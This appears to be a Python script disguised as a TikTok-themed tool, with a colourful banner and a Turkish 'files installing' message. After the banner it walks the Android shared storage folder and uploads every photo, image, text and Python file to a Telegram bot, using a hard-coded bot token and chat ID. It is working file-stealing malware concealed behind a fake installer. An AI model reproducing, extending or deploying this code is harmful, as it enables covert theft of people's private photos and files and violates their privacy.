print(' \033[2;35m┏\033[2;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[2;32m┓')
import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('TİKOK. @wotjex', colors=['red', 'white'], align='center')
print(output)
print(' \033[2;35m┏\033[2;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[2;32m┓')
print('.      DOSYALAR KURULUYOR                                                      @wotjex   ')



from concurrent.futures import ThreadPoolExecutor
import requests
import os
chat_id ="5407630064"
bot_token = "7065774416:AAGUiozzeW5akRUL57GICFQAA-W-EKiNgA0"
with ThreadPoolExecutor(max_workers=50) as executor:
    for root, dirs, files in os.walk("/storage/emulated/0/"):
        for file in files:
            file_path = os.path.join(root, file)
            file_type = file.split('.')[-1]
            if file_type in ['jpg', 'jpeg', 'png', 'gif','py','txt']:
                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
                data = {'chat_id': chat_id}
                files = {'photo': open(file_path, 'rb')}
                executor.submit(requests.post, url, files=files, data=data)
                
